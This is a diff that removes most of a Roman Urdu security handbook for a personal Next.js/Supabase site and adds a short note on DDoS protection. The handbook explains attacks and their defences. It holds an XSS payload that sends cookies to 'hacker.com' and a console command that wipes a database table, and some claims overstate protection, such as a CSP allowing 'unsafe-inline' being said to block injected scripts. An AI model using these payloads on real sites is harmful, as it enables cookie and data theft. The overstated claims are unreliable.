-export function hashPasswordPBKDF2(password: string, salt: string): string {
-  const iterations = 100000; // 100,000 cryptographic rounds
-  const keylen = 64;
-  const digest = 'sha512';
-  return crypto.pbkdf2Sync(password, salt, iterations, keylen, digest).toString('hex');
-}
-```
-
-### 4. Result:
-Ek modern RTX 4090 GPU jo standard MD5 ke 100 Billion hashes per second crack kar sakta hai, PBKDF2 ke mushkil se chand thousand check kar pata hai. Password crack karna virtually impossible ban jata hai!
-
----
-
-## Module 6: Direct Client Database Tampering
-### (Moving Writes to Authenticated Server APIs)
-
-### 1. Attack Ka Naam & Concept
-**Attack Name:** Client-Side Database Hijacking / Insecure Direct Object References (IDOR)
-
-### 2. Hacker Kaise Attack Karta Tha (Puraana Tareeqa)?
-Pehle agar client code mein Supabase ki direct update calls hon:
-```javascript
-// Browser Console mein hacker likhta tha:
-await supabase.from('projects').delete().neq('id', '0');
-```
-Kyunke Supabase ka URL aur Anon Key frontend JavaScript mein visible hote hain, hacker browser ke developer tools khol kar database par direct SQL commands run karne ki koshish karta tha.
-
-### 3. Humne Code Mein Kaise Save Kiya?
-Humne tamaam state-modifying actions (Insert, Update, Delete) ko frontend se nikaal kar **Protected Next.js Server APIs** mein shift kar diya:
-
-- [src/pages/api/admin/projects.ts](file:///C:/Users/saqib/Downloads/mrsaqib242/src/pages/api/admin/projects.ts)
-- [src/pages/api/admin/gallery.ts](file:///C:/Users/saqib/Downloads/mrsaqib242/src/pages/api/admin/gallery.ts)
-- [src/pages/api/admin/inquiries.ts](file:///C:/Users/saqib/Downloads/mrsaqib242/src/pages/api/admin/inquiries.ts)
-- [src/pages/api/admin/pricing.ts](file:///C:/Users/saqib/Downloads/mrsaqib242/src/pages/api/admin/pricing.ts)
-- [src/pages/api/admin/tools.ts](file:///C:/Users/saqib/Downloads/mrsaqib242/src/pages/api/admin/tools.ts)
-
-Frontend ab sirf server endpoint ko call karta hai:
-```typescript
-// Frontend service: src/lib/projectsService.ts
-const res = await fetch('/api/admin/projects', {
-  method: 'POST',
-  headers: { 'Content-Type': 'application/json' },
-  credentials: 'include', // Server cookie automatically passes
-  body: JSON.stringify({ project })
-});
-```
-
-Server par:
-1. `validateRequestOrigin(req)` check hota hai.
-2. `verifyAdminSessionToken(token)` verify hota hai.
-3. Agar authenticated ho, tab server-side `supabaseAdmin` (jiska key client ke paas kabhi nahi hota) database ko securely update karta hai.
-
----
-
-## Module 7: Clickjacking & UI Redressing
-### (X-Frame-Options: DENY & CSP frame-ancestors)
-
-### 1. Attack Ka Naam & Concept
-**Attack Name:** Clickjacking (UI Redress Attack)
-
-### 2. Hacker Kaise Attack Karta Hai?
-Hacker ek website banata hai: `free-prize-winner.com`.
-Wo background mein aapki website ko ek invisible iframe mein load kar deta hai (`opacity: 0`).
-Iframe ke theek us button par jahan aapka "Delete Project" ya "Change Admin Password" ka button hai, hacker upar ek aam button laga deta hai: *"Click here to claim $1000"*.
-Aap us prize wale button par click karte hain, lekin asal mein click aapki website ke invisible button par hota hai!
-
-### 3. Humne Code Mein Kaise Save Kiya?
-[next.config.mjs](file:///C:/Users/saqib/Downloads/mrsaqib242/next.config.mjs) mein strict security headers lagaye:
-
-```javascript
-{
-  key: 'X-Frame-Options',
-  value: 'DENY', // 🛡️ Kisi bhi iframe mein open hona sakhti se mana hai!
-},
-{
-  key: 'Content-Security-Policy',
-  value: "... frame-ancestors 'none'; ...", // Modern W3C Standard
-}
-```
-
-### 4. Hacker Kyun Haar Gaya?
-Duniya ka koi bhi browser jab `X-Frame-Options: DENY` dekhta hai, toh wo iframe ke andar page load karne se foran inkaar kar deta hai aur screen grey/blank ho jaati hai!
-
----
-
-## Module 8: MIME Type Sniffing & Drive-By Executions
-### (X-Content-Type-Options: nosniff)
-
-### 1. Attack Ka Naam & Concept
-**Attack Name:** MIME Confused Attack / Drive-By Code Execution
-
-### 2. Hacker Kaise Attack Karta Hai?
-Hacker aapki site par ek photo upload karne ki koshish karta hai: `avatar.jpg`.
-Lekin asal mein us file ke andar JavaScript ka virus hota hai:
-`<script>maliciousCode()</script>`
-Agar server `Content-Type: image/jpeg` bhejta hai, toh purane ya weak browsers file ke pehle chand bytes check karke kehte hain: *"Arrey yeh toh script jesi lag rahi hai, chalo ise JavaScript samajh kar run kar dete hain!"*
-
-### 3. Humne Code Mein Kaise Save Kiya?
-[next.config.mjs](file:///C:/Users/saqib/Downloads/mrsaqib242/next.config.mjs) mein header diya:
-```javascript
-{
-  key: 'X-Content-Type-Options',
-  value: 'nosniff', // 🛡️ Browser ko order hai ke khud se dimagh na chalaye!
-}
-```
-
-### 4. Result:
-Browser sirf usi format mein file ko render karega jo server ne declare kiya hai. Malicious script execution 100% block ho jati hai.
-
----
-
-## Module 9: SSL Stripping & Man-In-The-Middle (MitM) Attacks
-### (HSTS: Strict-Transport-Security Preload)
-
-### 1. Attack Ka Naam & Concept
-**Attack Name:** SSL Stripping & Man-In-The-Middle (MitM) Packet Sniffing
-
-### 2. Hacker Kaise Attack Karta Hai?
-Maan lijiye aap kisi cafe, airport, ya public Wi-Fi par baithe hain.
-Hacker usi Wi-Fi par ek software (jaise `sslstrip` ya `Wireshark`) chalata hai.
-Jab aap `mrsaqib242.vercel.app` likhte hain, browser pehle HTTP par request bhejta hai taake HTTPS par redirect ho sake.
-Hacker us redirect ko beech mein hi rok leta hai aur aapko HTTP (unencrypted) connection par rakhta hai, jis se aapke saare passwords aur inquiries hacker ke laptop par clear text mein show hoti hain!
-
-### 3. Humne Code Mein Kaise Save Kiya?
-[next.config.mjs](file:///C:/Users/saqib/Downloads/mrsaqib242/next.config.mjs) mein humne **HSTS Preload Standard** enforce kiya:
-
-```javascript
-{
-  key: 'Strict-Transport-Security',
-  value: 'max-age=63072000; includeSubDomains; preload', // 🛡️ 2 Years HTTPS Enforcement
-}
-```
-
-### 4. Result:
-Browser ko memory mein yaad rehta hai ke is website se **kabhi bhi HTTP par baat nahi karni**, chahe user explicitly `http://` bhi likhe, browser request bhejne se pehle hi usay HTTPS mein convert kar deta hai!
-
----
-
-## Module 10: Cross-Site Scripting (XSS) & Content Security Policy (CSP)
-
-### 1. Attack Ka Naam & Concept
-**Attack Name:** Cross-Site Scripting (Stored & Reflected XSS)  
-**OWASP Category:** A03:2021-Injection
-
-### 2. Hacker Kaise Attack Karta Hai?
-Hacker inquiry form ya feedback section mein apna naam likhta hai:
-`<img src=x onerror="fetch('https://hacker.com/steal?data=' + document.cookie)">`
-Agar ye naam bina sanitization ke page par render ho jaye, toh website dekhne wale har visitor aur admin ke browser mein hacker ka script chal jayega!
-
-### 3. Humne Code Mein Kaise Save Kiya?
-1. **JSON-LD Schema Encoding:** [src/pages/_app.tsx](file:///C:/Users/saqib/Downloads/mrsaqib242/src/pages/_app.tsx) mein `<` character ko replace kiya:
-   ```typescript
-   JSON.stringify(unifiedSchema).replace(/</g, '\\u003c')
-   ```
-2. **Content Security Policy (CSP):** [next.config.mjs](file:///C:/Users/saqib/Downloads/mrsaqib242/next.config.mjs) ke zariye browser ko strictly bata diya gaya ke scripts sirf hamari domain aur verified Google Analytics se execute hon:
-   ```javascript
-   default-src 'self';
-   script-src 'self' 'unsafe-eval' 'unsafe-inline' https://www.googletagmanager.com https://www.google-analytics.com;
-   img-src 'self' data: blob: https: https://ik.imagekit.io;
-   connect-src 'self' https://*.supabase.co wss://*.supabase.co;
-   frame-ancestors 'none';
-   ```
-
-### 4. Result:
-Agar koi hacker kisi injection ke zariye malicious domain se script load karne ki koshish bhi kare, toh browser ka CSP parser us script ko network level par hi **Refuse to execute** kar deta hai!
-
----
-
-## Module 11: Automated Reconnaissance & Admin Discovery
-### (robots.txt Defense)
-
-### 1. Attack Ka Naam & Concept
-**Attack Name:** Directory Harvesting & Admin Discovery via Search Engine Reconnaissance
-
-### 2. Hacker Kaise Attack Karta Hai?
-Hackers manual scanning karne se pehle target website ka `robots.txt` file check karte hain:
-```
-# GHALAT robots.txt:
-User-agent: *
-Disallow: /mradmin   <-- ❌ Hacker ko pata chal gaya ke admin portal ka secret url "/mradmin" hai!
-```
-Security through obscurity ka rule hai ke kabhi bhi apne secret endpoints khud public directory mein expose na karein.
-
-### 3. Humne Code Mein Kaise Save Kiya?
-[public/robots.txt](file:///C:/Users/saqib/Downloads/mrsaqib242/public/robots.txt) se `/mradmin` ko nikaal diya gaya:
-```
-User-agent: *
-Allow: /
-Disallow: /api/
-Disallow: /admin
-Disallow: /private/
-```
-Ab automated bots ya recon tools ko pata hi nahi chalta ke admin portal ka exact address kya hai.
-
----
-
-## Module 12: AI API Quota Drainage & Form Flooding
-### (Sliding Window Rate Limiter & Honeypot Trap)
-
-### 1. Attack Ka Naam & Concept
-**Attack Name:** Denial of Wallet (DoW) & Automated Spam Bot Flooding
-
-### 2. Hacker Kaise Attack Karta Hai?
-- **AI Quota Attack:** Hamari website par Gemini AI engine chalta hai (`/api/geo`). Agar koi bot script bana kar 10,000 requests bhej de, toh hamara Google Cloud / Gemini API quota khatam ho jayega ya hazaron rupaye ka bill ban jayega.
-- **Form Spam:** Automated spam bots inquiry form par second mein 500 fake messages bhejte hain.
-
-### 3. Humne Code Mein Kaise Save Kiya?
-
-#### A. Gemini AI Sliding Window Rate Limiter ([src/pages/api/geo.ts](file:///C:/Users/saqib/Downloads/mrsaqib242/src/pages/api/geo.ts)):
-```typescript
-const geoRateLimitMap = new Map<string, { count: number; resetTime: number }>();
-
-function checkGeoRateLimit(ip: string): boolean {
-  const now = Date.now();
-  const windowMs = 60 * 1000; // 1 minute window
-  const maxRequests = 10;     // Max 10 AI queries per minute per IP
-
-  const current = geoRateLimitMap.get(ip);
-  if (!current || now > current.resetTime) {
-    geoRateLimitMap.set(ip, { count: 1, resetTime: now + windowMs });
-    return true;
-  }
-  if (current.count >= maxRequests) return false; // 🚫 Block!
-  current.count++;
-  return true;
-}
-```
-
-#### B. The Honeypot Trap ([src/lib/inquiriesService.ts](file:///C:/Users/saqib/Downloads/mrsaqib242/src/lib/inquiriesService.ts)):
-Form ke andar ek hidden field banayi gayi jo CSS se aam insano ko nazar nahi aati:
-```html
-<input type="text" name="honeypot" style="display:none" tabindex="-1" autocomplete="off" />
-```
-Automated spam bots har input field ko fill karte hain. Agar is field mein koi text aaya, toh backend foran samajh jata hai ke yeh koi bot hai aur request ko database mein save kiye baghair silently ignore kar deta hai!
-
----
-
-## Module 13: Production Source Code Leaks
-### (Source Maps Hardening)
-
-### 1. Attack Ka Naam & Concept
-**Attack Name:** Client-Side Source Map Reverse Engineering
-
-### 2. Hacker Kaise Attack Karta Hai?
-Jab developers `productionBrowserSourceMaps: true` on chhor dete hain:
-Hacker Chrome DevTools > **Sources Tab** kholta hai aur aapka poora original TypeScript code (with comments, helper functions, aur internal API architectures) bilkul saaf saaf parh leta hai!
-
-### 3. Humne Code Mein Kaise Save Kiya?
-[next.config.mjs](file:///C:/Users/saqib/Downloads/mrsaqib242/next.config.mjs) mein production browser source maps ko **disabled** rakha gaya hai. Production build mein sirf minified, obfuscated chunk files hoti hain jahan se code reverse engineer karna namumkin hota hai.
-
----
-
-## Master Security Checklist & Verification Commands
-
-Aap jab bhi apna code verify karna chahein, in terminal commands se foran check kar sakte hain:
-
-### 1. Test Admin Endpoint Security (Token Required):
-```bash
-curl.exe -i -s https://mrsaqib242.vercel.app/api/admin/projects
-# Expected Response: 401 Unauthorized {"error":"Unauthorized: Admin token required."}
-```
-
-### 2. Test CSRF Protection (Fake Origin Block):
-```bash
-curl.exe -i -X POST https://mrsaqib242.vercel.app/api/admin/projects -H "Origin: https://evil.com"
-# Expected Response: 403 Forbidden {"error":"Forbidden: Request origin invalid."}
-```
-
-### 3. Test Security HTTP Headers (HSTS, CSP, X-Frame-Options):
-```bash
-curl.exe -s -D - -o nul https://mrsaqib242.vercel.app/
-# Look for:
-# - Strict-Transport-Security: max-age=63072000; includeSubDomains; preload
-# - X-Frame-Options: DENY
-# - X-Content-Type-Options: nosniff
-# - Content-Security-Policy: default-src 'self'...
-```
-
----
-
-## 🎓 Khulasa (Conclusion)
-Aapki application ab ek standard website se nikal kar **Enterprise-Grade Secured Web Application** ban chuki hai. Har layer par validation, cryptography, sanitization aur origin protection ka pehra laga hua hai. Is handbook ko hamesha apne paas mehfooz rakhein taake aage ja kar aap jo bhi naya project banayein, usmein bhi yehi gold standard security implement kar sakein!
+**8. Vercel Edge DDoS Protection**
+Kyunke website Vercel par hai, agar laakhon (millions) fake bots ikathay attack karein website ko down/crash karne ke liye (DDoS attack), toh Vercel ke global servers un bots ko website tak pohnchne se pehle hi raaste mein filter kar ke hawa mein block kar dete hain. Aapki website down nahi hoti. 
